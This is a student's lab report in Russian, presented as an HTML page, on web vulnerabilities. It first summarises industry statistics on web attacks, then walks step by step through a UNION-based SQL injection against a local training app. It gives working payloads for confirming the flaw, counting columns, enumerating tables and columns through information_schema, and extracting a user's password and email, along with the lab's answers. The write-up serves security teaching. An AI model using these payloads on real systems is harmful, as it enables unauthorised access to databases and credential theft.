@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Лабораторная работа №1 — Токарев Валерий</title>
+<style>
+  body { font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 24px; color: #222; line-height: 1.65; }
+  h1 { border-bottom: 2px solid #333; padding-bottom: 8px; }
+  h2 { border-bottom: 1px solid #ccc; padding-bottom: 4px; margin-top: 44px; }
+  h3 { margin-top: 30px; color: #333; }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; }
+  th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
+  th { background: #f0f0f0; font-weight: bold; }
+  code { background: #f5f5f5; padding: 2px 5px; border-radius: 3px; font-family: monospace; font-size: 0.9em; }
+  pre { background: #f5f5f5; padding: 14px; border-radius: 5px; overflow-x: auto; border-left: 3px solid #aaa; }
+  pre code { background: none; padding: 0; }
+  hr { border: none; border-top: 1px solid #ddd; margin: 36px 0; }
+  em { color: #555; }
+  .author { color: #555; margin-top: -8px; margin-bottom: 32px; }
+</style>
+</head>
+<body>
+
+<h1>Лабораторная работа №1. Веб-уязвимости и SQL-инъекции</h1>
+<p class="author">Токарев Валерий</p>
+
+<h2>Часть 1. Статистика атак</h2>
+
+<h3>1. Источники</h3>
+<ul>
+  <li>Verizon DBIR 2025 — https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf</li>
+  <li>OWASP Top 10 2025 — https://owasp.org/Top10/2025/</li>
+  <li>IBM X-Force Threat Intelligence Index 2025 — https://www.bosconsulting.lt/reports/ibm-x-force-threat-intelligence-index-2025-report.pdf</li>
+  <li>Positive Technologies — https://ptsecurity.com/about/news/pt-named-weaknesses-in-cyber-defense-of-companies/</li>
+  <li>Edgescan Vulnerability Statistics Report 2025 — https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf</li>
+  <li>AionCloud Web Attack Trend Report 2025 — https://www.aioncloud.com/2025-03-web-attack-trend-report/</li>
+  <li>Solar JSOC / RT Solar — https://rt-solar.ru/analytics/reports/5375/</li>
+</ul>
+
+<hr>
+
+<h3>2. Доля атак через веб-уязвимости</h3>
+
+<p>Сразу скажу — цифры у всех разные, потому что считают по-разному. Одни берут только подтверждённые утечки, другие вообще все инциденты куда попало. Поэтому смотреть на конкретное число без понимания scope смысла нет.</p>
+
+<p><strong>Verizon DBIR 2025</strong> — глобальная выборка, только подтверждённые breaches. Эксплуатация уязвимостей как начальный вектор — около 20%, и это +34% к прошлому году. Тут важный нюанс: в эти 20% входят не только веб-приложения, но и VPN, всякие edge-устройства на периметре. Так что реальная доля именно веба будет немного меньше.</p>
+
+<p><strong>IBM X-Force 2025</strong> — смотрели на критическую инфраструктуру отдельно. Там цифра повыше: 33% инцидентов начинались с эксплуатации публично доступных приложений. В каждом четвёртом кейсе — конкретно веб-уязвимость.</p>
+
+<p><strong>Positive Technologies</strong> — российский рынок, корпоративный сегмент. По их данным веб-уязвимости на внешнем периметре — вообще самый популярный способ войти внутрь, 36%. Это уже конкретно про веб, не про периметр в целом.</p>
+
+<p><strong>AionCloud 2025</strong> — эти анализировали реальный трафик атак на веб-приложения, поэтому у них другая методология. Получилось 25–38%, и чаще всего это именно SQL-инъекции.</p>
+
+<p>Если коротко: от 20% до 36% в зависимости от того, кто и что считает. Чем уже фокус на веб и российский/корпоративный сегмент — тем выше цифра.</p>
+
+<hr>
+
+<h3>3. Распределение по типам уязвимостей</h3>
+
+<p><strong>OWASP Top 10 (2025):</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Категория</th>
+      <th>AIR</th>
+      <th>AC</th>
+      <th>Total Occurrences</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>Broken Access Control</td><td>3.74%</td><td>42.93%</td><td>1 839 701</td></tr>
+    <tr><td>Security Misconfiguration</td><td>3.00%</td><td>52.35%</td><td>719 084</td></tr>
+    <tr><td>Software Supply Chain Failures</td><td>5.72%</td><td>27.47%</td><td>215 248</td></tr>
+    <tr><td>Cryptographic Failures</td><td>3.80%</td><td>47.74%</td><td>1 665 348</td></tr>
+    <tr><td>Injection</td><td>3.08%</td><td>42.93%</td><td>1 404 249</td></tr>
+    <tr><td>Insecure Design</td><td>1.86%</td><td>35.18%</td><td>729 882</td></tr>
+    <tr><td>Authentication Failures</td><td>2.92%</td><td>37.14%</td><td>1 120 673</td></tr>
+    <tr><td>Software/Data Integrity Failures</td><td>2.75%</td><td>45.49%</td><td>501 327</td></tr>
+    <tr><td>Security Logging Failures</td><td>3.91%</td><td>46.48%</td><td>260 288</td></tr>
+    <tr><td>Mishandling of Exceptional Conditions</td><td>2.95%</td><td>37.95%</td><td>769 581</td></tr>
+  </tbody>
+</table>
+
+<p><em>AIR — средняя частота встречаемости в выборке приложений; AC — доля приложений, где нашли хотя бы одну такую уязвимость.</em></p>
+
+<p>По OWASP Injection на первый взгляд выглядит не так страшно — AIR всего 3.08%. Но это потому что OWASP считает по коду приложений, а не по реальным атакам. Если смотреть на то, что реально эксплуатируется — картина другая.</p>
+
+<p><strong>Edgescan 2025</strong> — данные из реальных пентестов, поэтому тут SQL-инъекции сразу выходят на первое место:</p>
+<ul>
+  <li>SQL-инъекции — 19–28%</li>
+  <li>XSS (stored) — 10–10.5%</li>
+  <li>Загрузка вредоносных файлов — ~7%</li>
+  <li>XSS (reflected) — ~5.5%</li>
+  <li>Brute force — ~4.2%</li>
+  <li>Path traversal — ~2.7%</li>
+  <li>CSRF — ~2.1%</li>
+</ul>
+
+<p>Расхождение между OWASP и Edgescan вполне логичное: одни смотрят на код, другие на то, что реально используют в атаках. SQLi старая уязвимость, казалось бы все знают как защищаться, но по факту до сих пор встречается чуть ли не в каждой четвёртой атаке.</p>
+
+<hr>
+
+<h2>Часть 2. SQL-инъекция на практике</h2>
+
+<h3>Подготовка</h3>
+<p>Скачал Docker Desktop, создал папку, положил туда docker-compose.yml, запустил:</p>
+<pre><code>docker-compose up -d</code></pre>
+<p>Открыл <code>http://localhost:8080</code>, установил БД по ссылке на странице. Появилась форма с одним параметром — <code>id</code>.</p>
+
+<hr>
+
+<h3>Шаг 1. Смотрю что вообще есть</h3>
+<p>Начал просто с перебора — интересно посмотреть какие пользователи есть в базе:</p>
+<pre><code>http://localhost:8080/task/?id=1   →  Ваш id:1  Ваш логин:admin
+http://localhost:8080/task/?id=2   →  Ваш id:2  Ваш логин:Gordey
+http://localhost:8080/task/?id=3   →  Ваш id:3  Ваш логин:Matroskin
+http://localhost:8080/task/?id=4   →  Ваш id:4  Ваш логин:Vinni-pukh
+...
+http://localhost:8080/task/?id=9   →  Ваш id:9  Ваш логин:Volk2
+http://localhost:8080/task/?id=10  →  (пусто)</code></pre>
+<p>Итого 9 пользователей. Нашёл обоих нужных: Volk2 — id=9, Vinni-pukh — id=4. Это пригодится потом.</p>
+
+<hr>
+
+<h3>Шаг 2. Проверяю есть ли инъекция</h3>
+<p>Добавляю кавычку в конец — классический первый шаг:</p>
+<pre><code>http://localhost:8080/task/?id=1'</code></pre>
+<p>Ответ:</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL 
+server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></pre>
+<p>Сервер вернул голую ошибку MySQL — значит параметр подставляется в запрос напрямую, без обработки. Из текста ошибки кстати видна часть структуры запроса: <code>WHERE id='...' LIMIT 0,1</code>. Уязвимость подтверждена.</p>
+
+<hr>
+
+<h3>Шаг 3. Определяю количество столбцов</h3>
+<p>Чтобы использовать UNION SELECT, нужно знать сколько столбцов в оригинальном запросе. Делаю через ORDER BY, бинарным поиском — быстрее чем по одному:</p>
+<pre><code>http://localhost:8080/task/?id=9' order by 10 --+  →  Unknown column '10' in 'order clause'
+http://localhost:8080/task/?id=9' order by 5 --+   →  Unknown column '5' in 'order clause'
+http://localhost:8080/task/?id=9' order by 4 --+   →  Unknown column '4' in 'order clause'
+http://localhost:8080/task/?id=9' order by 3 --+   →  Ваш id:9  Ваш логин:Volk2</code></pre>
+<p>На 3 запрос выполнился нормально — значит столбцов ровно 3.</p>
+
+<hr>
+
+<h3>Шаг 4. Имя базы данных</h3>
+<p>Использую несуществующий id=27, чтобы оригинальный запрос не вернул ничего и в вывод попало только то, что я добавляю через UNION:</p>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,database(),3%23
+→  Ваш id:1  Ваш логин:security</code></pre>
+<p>База называется <code>security</code>. Символ <code>%23</code> — это URL-кодировка <code>#</code>, комментарий в MySQL. Работает надёжнее чем <code>--+</code> в некоторых конфигурациях.</p>
+
+<hr>
+
+<h3>Шаг 5. Список таблиц</h3>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security'%23
+→  Ваш логин:emails,users</code></pre>
+<p>Две таблицы: <code>emails</code> и <code>users</code>. Логично — пароли скорее всего в users, почты в emails.</p>
+
+<hr>
+
+<h3>Шаг 6. Структура таблиц</h3>
+<p>Смотрю что внутри <code>users</code>:</p>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'%23
+→  Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></pre>
+<p>Нужные столбцы — <code>username</code> и <code>password</code>.</p>
+
+<p>Теперь <code>emails</code>:</p>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='emails'%23
+→  Ваш логин:id,email_id</code></pre>
+<p>Немного неожиданное название <code>email_id</code> вместо просто <code>email</code>, но разберёмся.</p>
+
+<hr>
+
+<h3>Шаг 7. Достаю нужные данные</h3>
+
+<p><strong>Задание 1 — пароль Volk2:</strong></p>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,password,3 FROM users WHERE username='Volk2'%23
+→  Ваш логин:Wa spoiuuuuu</code></pre>
+
+<p><strong>Задание 2 — почта Vinni-pukh:</strong></p>
+<p>Vinni-pukh был id=4, нашёл ещё в самом начале при переборе. Запрашиваю из emails по этому id:</p>
+<pre><code>http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,email_id,3 FROM emails WHERE id=4%23
+→  Ваш логин:honey_lover@otus-lab.com</code></pre>
+
+<hr>
+
+<h3>Итог</h3>
+<table>
+  <thead>
+    <tr>
+      <th>Задание</th>
+      <th>Ответ</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Пароль пользователя <strong>Volk2</strong></td>
+      <td><code>Wa spoiuuuuu</code></td>
+    </tr>
+    <tr>
+      <td>Email пользователя <strong>Vinni-pukh</strong></td>
+      <td><code>honey_lover@otus-lab.com</code></td>
+    </tr>
+  </tbody>
+</table>
+
+</body>
+</html>
